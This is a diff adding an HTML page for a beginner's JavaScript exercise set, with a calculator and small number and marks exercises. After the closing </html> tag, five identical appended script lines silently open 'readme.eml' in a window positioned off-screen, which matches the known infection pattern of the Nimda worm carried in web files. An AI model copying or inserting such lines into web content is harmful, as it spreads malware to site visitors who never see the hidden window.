@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Calculator</title>
+<!--==================================-->
+<!-- >>>>> links <<<<<<  -->
+<!--==================================-->
+    <link rel="stylesheet" href="assets/css/all.min.css">
+    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
+    <link rel="stylesheet" href="assets/css/my.style.css">
+    
+</head>
+<body>
+
+
+            <i class="fab fa-offline"></i>
+    <div class="my-4 text-center d-flex justify-content-center position-relative"> 
+        <button class="btn show btn-outline-danger px-5  fs-4" title="Show Calculator" id="sho" onclick="sho()">Show</button>
+        <button class="btn hiden btn-outline-danger px-5 fs-4  " title="hiden Calculator"  id="hid" onclick="hed()" duclick>Hide</button>
+    </div>
+    
+<div id="calc" class="container  text-center">
+    <div class="calc   m-auto ">
+        <input type="text" name="" id="text_view" class="form-control text_view">
+        <div class="buttons">
+            <button id="btn_c" class="btn_n btn_top"  onclick="btnc()">C</button>
+            <button id="btn_del" class="btn_n btn_top" value="" onclick="btndel()">Del</button>
+            <button id="btn_mod" class="btn_n btn_top" value="%" onclick="btnmod()">%</button>
+            <button id="btn_sub" class="btn_n btn_top" value="+" onclick="btnsub()">+</button>
+        </div>
+        <div class="buttons">
+            <button id="btn_7" class="btn_n" value="7" onclick="btn7()">7</button>
+            <button id="btn_8" class="btn_n" value="8" onclick="btn8()">8</button>
+            <button id="btn_9" class="btn_n" value="9" onclick="btn9()">9</button>
+            <button id="btn_div" class="btn_n btn_operat" value="/" onclick="btndiv()">/</button>
+        </div>
+        <div class="buttons">
+            <button id="btn_4" class="btn_n" value="4" onclick="btn4()">4</button>
+            <button id="btn_5" class="btn_n" value="5" onclick="btn5()">5</button>
+            <button id="btn_6" class="btn_n" value="6" onclick="btn6()">6</button>
+            <button id="btn_mult" class="btn_n btn_operat" value="*" onclick="btnmult()">*</button>
+        </div>
+        <div class="buttons">
+            <button id="btn_1" class="btn_n" value="1" onclick="btn1()">1</button>
+            <button id="btn_2" class="btn_n" value="2" onclick="btn2()">2</button>
+            <button id="btn_3" class="btn_n" value="3" onclick="btn3()">3</button>
+            <button id="btn_min" class="btn_n btn_operat" value="-" onclick="btnmin()">-</button>
+        </div>
+        <div class="buttons">
+            <button id="btn_0" class="btn_n" value="0" onclick="btn0()">0</button>
+            <button id="btn_dot" class="btn_n" value="." onclick="btndot()">.</button>
+            <button id="btn_eq" class="btn_n eq" value="=" onclick="btneq()">=</button>
+        </div>
+    </div>
+</div>
+
+
+<div class="container  text-white p-3">
+        <div class="text-center"><h1 class="">Exercise on Js</h1></div>
+        <div class="row">
+            <div class="col-md-6  text-center">
+<!-- question 1 -->
+                <div class="my-4 pb-3  lein-after position-relative">
+                <h5 class="mb-3">Enter number then print it</h5>
+                    <input  id="ques" type="number" class="form-control mb-3 w-75 m-auto " placeholder="Enter Number" value="">
+                    <button id="sub" class="btnn px-5">Reslt</button>
+                    <button id="res" type="reset" class="btnn px-5">Reset</button>
+                    <div class="p-2 w-75 m-auto  bb bg-dark text-white  mt-3 "  id="answer" ></div>
+                </div>
+<!-- question 2 -->
+                <div class="mt-5 pb-2 lein-after position-relative">
+                    <h5 class="mb-3">Enter number can divide by 3 & 4</h5>
+                    <input id="ques2" class="form-control mb-3 w-75 m-auto " placeholder="Enter number" type="number">
+                    <button id="sub2" class="btnn px-5"> Reslt</button>
+                    <button id="res2" class="btnn px-5" type="reset"> Reset</button>
+                    <div id="answer2" class="p-2 m-auto mt-3 bb bg-dark text-white w-75"></div>
+                </div>
+<!-- question 3 -->
+                <div class="mt-5 pb-2 lein-after position-relative">
+                    <h5 class="mb-3">Enter 2 number and print max </h5>
+                    <div class="w-75 m-auto mb-3 d-flex justify-content-between ">
+                        <input id="ques3" placeholder="Enter first" type="number">
+                        <input id="ques_3" placeholder="Enter second" type="number">
+                    </div>
+                    <button id="sub3" class="btnn me-2 px-5"> Reslt</button>
+                    <button id="res3" class="btnn px-5 mb-2" type="reset"> Reset</button>
+                    <div id="answer3" class="p-2 m-auto bb bg-dark text-white w-75 mt-2 "></div>
+                </div>
+<!-- question 4 -->
+                <div class="my-4 pb-2 lein-after position-relative">
+                    <h5 class="mb-3">Enter number and print negative or positive </h5>
+                    <input id="ques4" class="form-control mb-3 w-75 m-auto " placeholder="Enter first" type="number">
+                    <button id="sub4" class="btnn px-5 me-2"> Reslt</button>
+                    <button id="res4" class="btnn px-5" type="reset"> Reset</button>
+                    <div id="answer4" class="p-2 mt-3 m-auto bb bg-dark text-white w-75 mt-2 "></div>
+                </div>
+<!-- question 5 -->
+                <div class="my-4 pb-2 lein-after position-relative">
+                    <h5 class="mb-3">max number & min number </h5>
+                    <div class=" mb-3 d-flex m-auto w-75 justify-content-between">
+                        <input id="ques5" class="w-25" placeholder="first" type="number">
+                        <input id="ques_2_5" class="w-25" placeholder="second" type="number">
+                        <input id="ques_3_5" class="w-25" placeholder="third" type="number">
+                    </div>
+                    <button id="sub5" class="btnn px-5"> Reslt</button>
+                    <button id="res5" class="btnn px-5 mb-3 ms-2" type="reset"> Reset</button>
+                    <div id="answer5" class="p-2 m-auto bb bg-dark text-white w-75  mt-2 "></div>
+                    <div id="answer_5" class="p-2 m-auto bb bg-dark text-white w-75 mt-2 "></div>
+                </div>
+<!-- question 6 -->
+                <div class="my-4 pb-2 lein-after position-relative">
+                    <h5 class="mb-3">Number is oven or odd </h5>
+                    <input id="ques6" class="form-control mb-3 w-75 m-auto" placeholder="first" type="number">
+                    <button id="sub6" class="btnn px-5 me-2"> Reslt</button>
+                    <button id="res6" class="btnn px-5 mb-3" type="reset"> Reset</button>
+                    <div id="answer6" class="p-2 m-auto bb bg-dark text-white w-75  mt-2 "></div>
+                </div>
+<!-- question 7 -->
+                <div class="my-4 pb-2 lein-after position-relative">
+                    <h5 class="mb-3">Print vowel or Consonant</h5>
+                    <input id="ques7" class="form-control mb-3 w-75 m-auto" placeholder="first" type="text" maxlength="1">
+                    <button id="sub7" class="btnn px-5 me-2"> Reslt</button>
+                    <button id="res7" class="btnn px-5 mb-3" type="reset"> Reset</button>
+                    <div id="answer7" class="p-2 m-auto bb bg-dark text-white w-75  mt-2 "></div>
+                </div>
+            </div>
+            <div class="col-md-6 text-center">
+<!-- question 8 -->
+                    <div class="my-4 pb-2  lein-after position-relative">
+                        <h5 class="mb-3">Print all number between 1 to this number</h5>
+                            <input  id="ques8" type="number" class="form-control-1 " placeholder="Enter Number" value="">
+                            <button id="sub8" class="btnn">Reslt</button>
+                            <div class="p-2 m-auto bb bg-dark text-white w-75 mt-2 fs-4 " >Reslt in Consol</div>
+                    </div>
+<!-- question 9 -->
+                    <div class="my-4 pb-2 mt-5 lein-after position-relative">
+                        <h5 class="mb-3">Print a multiplication table up to 12</h5>
+                            <input  id="ques9" type="number" class="form-control-1 " placeholder="Enter Number" value="">
+                            <button id="sub9" class="btnn">Reslt</button>
+                            <div class="p-2 m-auto bb bg-dark text-white w-75 mt-2 fs-4 " >Reslt in Consol</div>
+                    </div>
+<!-- question 10 -->
+                    <div class="my-4 pb-2 mt-5 lein-after position-relative">
+                        <h5 class="mb-3">Print all event numbersbetween 1 to My number</h5>
+                            <input  id="ques10" type="number" class="form-control-1 " placeholder="Enter Number" value="">
+                            <button id="sub10" class="btnn">Reslt</button>
+                            <div class="p-2 m-auto bb bg-dark text-white w-75 mt-2 fs-4 " >Reslt in Consol</div>
+                    </div>
+<!-- question 12 -->
+                        <div class="my-4 pb-2 mt-5 lein-after position-relative">
+                            <h5 class="mb-3">Enter number and Print the Power ^</h5>
+        
+                            <div class="w-75 m-auto mb-3 d-flex justify-content-between ">
+                                <input id="ques12" class="" placeholder="first" type="number">
+
+                            <input id="ques_12" class="" placeholder="Power" type="number">
+                            </div>
+                            <button id="sub12" class="btnn px-5 me-2"> Reslt</button>
+                            <button id="res12" class="btnn px-5 mb-3" type="reset"> Reset</button>
+        
+                            <div id="answer12" class="p-2 m-auto bb bg-dark text-white w-75 mt-2 "></div>
+        
+                        </div>
+<!-- question 13 -->
+                        <div class="my-4 pb-2 mt-5 lein-after position-relative ">
+                            <h5 class="mb-3">Enter Marks and Print it</h5>
+        
+                            <input id="ques_13" class="w-50 text-center mb-1" placeholder="Physics" type="number">
+
+                            <input id="ques_2_13" class="w-50 text-center mb-1" placeholder="Chemistry" type="number">
+                            <input id="ques_3_13" class="w-50 text-center mb-1" placeholder="Biology" type="number">
+                            <input id="ques_4_13" class="w-50 text-center mb-1" placeholder="Computere" type="number">
+                            <input id="ques_5_13" class="w-50 text-center mb-1 d-block m-auto" placeholder="Mathematics" type="number">
+
+                            <button id="sub13" class="btnn px-5"> Reslt</button>
+                            <button id="res13" class="btnn px-5" type="reset"> Reset</button>
+                            <br>
+                            <div class=" d-flex justify-content-center align-items-center"><span class="btn d-inline-block fs-5 w-25  text-white">Total</span><div id="answer13" class="p-2 m-auto bb bg-dark text-white w-75 mt-2 d-inline-block "></div></div>
+
+                            <div class="d-flex justify-content-center align-items-center"><span class="btn  fs-5 w-25  text-white">Average</span><div id="answer_2_13" class="p-2 m-auto bb bg-dark text-white w-75 mt-2 d-inline-block "></div></div>
+
+                            <div class="d-flex justify-content-center align-items-center"><span class="btn  fs-5 w-25  text-white">Percentage</span><div id="answer_3_13" class="p-2 d-inline-block m-auto bb bg-dark text-white w-75 mt-2 "></div></div>
+        
+                        </div>
+<!-- question 14 -->
+<div class="my-4 pb-2 mt-5 lein-after position-relative ">
+    <h5 class="mb-3">Enter Marks and Print it</h5>
+
+    <div class="my-3 "> 
+        <div class="d-flex justify-content-center align-items-center mb-1">
+            <input id="ques_14" class="w-25 me-3 p-1 text-center mb-1" placeholder="Physics" type="number">
+            <div id="answer14"    class="d-inline-block w-50  hei border mb-1"></div>
+        </div>
+        
+        <div class="d-flex justify-content-center align-items-center mb-1">
+            <input id="ques_2_14" class="w-25 me-3 p-1 text-center mb-1" placeholder="Chemistry" type="number">
+        <div id="answer_1_14" class="d-inline-block w-50  hei border "></div>
+        </div>
+
+        <div class="d-flex justify-content-center align-items-center mb-1">
+            <input id="ques_3_14" class="w-25 me-3 p-1 text-center mb-1" placeholder="Biology" type="number">
+        <div id="answer_2_14" class="d-inline-block w-50  hei border"></div>
+        </div>
+        <div class="d-flex justify-content-center align-items-center mb-1">
+            <input id="ques_4_14" class="w-25 me-3 p-1 text-center mb-1" placeholder="Computere" type="number">
+        <div id="answer_3_14" class="d-inline-block w-50  hei border"></div>
+        </div>
+        <div  class="d-flex justify-content-center align-items-center mb-1">
+            <input id="ques_5_14" class="w-25 me-3 p-1 text-center mb-1 " placeholder="Mathematics" type="number">
+            <div id="answer_4_14" class="d-inline-block w-50  hei border"></div>
+        </div>
+        <div id="totale_d"  class="py-1 border w-75 m-auto"></div>
+    </div>
+
+    <button id="sub14" class="btnn px-5"> Reslt</button>
+    <button id="res14" class="btnn px-5" type="reset"> Reset</button>
+    <br>
+
+</div>
+            </div>
+        </div>
+</div>
+<!--==================================-->
+<!-- >>>>> links <<<<<<  -->
+<!--==================================-->
+    <script src="assets/Js/all.min.js"></script>
+    <script src="assets/Js/bootstrap.bundle.js"></script>
+    <script src="assets/Js/my.script.js"></script>
+</body>
+</html>
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
